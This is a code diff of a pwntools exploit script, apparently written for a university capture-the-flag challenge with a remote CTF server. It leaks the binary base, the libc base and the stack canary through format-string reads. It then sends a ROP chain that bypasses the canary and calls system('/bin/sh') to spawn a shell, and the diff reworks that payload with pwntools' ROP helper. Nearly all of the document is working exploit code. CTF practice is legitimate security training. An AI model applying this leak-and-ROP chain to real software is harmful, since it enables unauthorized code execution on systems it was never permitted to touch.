@@ -16,12 +16,13 @@ elf = ELF(TARGET)
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 def attach(r):
-    if not REMOTE:
-        bkps = ['*motivation']
-        cmds = []
+    if REMOTE:
+        return
 
-        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
-    return
+    bkps = []
+    cmds = []
+
+    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
 
 def exploit(r):
     attach(r)
@@ -37,34 +38,37 @@ def exploit(r):
     r.recvuntil(b'Quote: "')
 
     main = int(r.recvuntil(b'"')[:-1].decode(), 16)
-    pie_base = main - elf.sym['main']
+    elf.address = main - elf.sym.main
 
     r.sendlineafter(b'Plate\n', b'6')
     r.sendlineafter(b'quote: ', b'%15$p')
     r.recvuntil(b'Quote: "')
 
     main_ret = int(r.recvuntil(b'"')[:-1].decode(), 16)
-    libc_base = main_ret - libc.libc_start_main_return
-    log.info(f'main_ret: {hex(main_ret)}')
-    pause()
+    libc.address = main_ret - libc.libc_start_main_return
+    binsh = next(libc.search('/bin/sh\0'))
 
     r.sendlineafter(b'Plate\n', b'6')
     r.sendlineafter(b'quote: ', b'%9$p')
     r.recvuntil(b'Quote: "')
 
     canary = int(r.recvuntil(b'"')[:-1].decode(), 16)
-    pop_rdi = pie_base + 0x1336
-    ret = pie_base + 0x101a
-    binsh = libc_base + next(libc.search('/bin/sh\0'))
-    system = libc_base + libc.sym['system']
+    rop = ROP(elf)
+
+    rop.raw(cyclic(8))
+    rop.raw(p64(canary))
+    rop.raw(cyclic(8))
+    rop.raw(rop.ret[0])
+    rop.call(libc.sym.system, [binsh])
 
     r.sendlineafter(b'Plate\n', b'6')
-    r.sendlineafter(b'quote: ', cyclic(8) + p64(canary) + cyclic(8) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
+    r.sendlineafter(b'quote: ', rop.chain())
+    pause()
     r.interactive()
     return
 
 if __name__ == '__main__':
-    if len(sys.argv)==2 and sys.argv[1]=='remote':
+    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
         REMOTE = True
         r = remote('bench-225.ctf.umasscybersec.org', 1337)
     else:
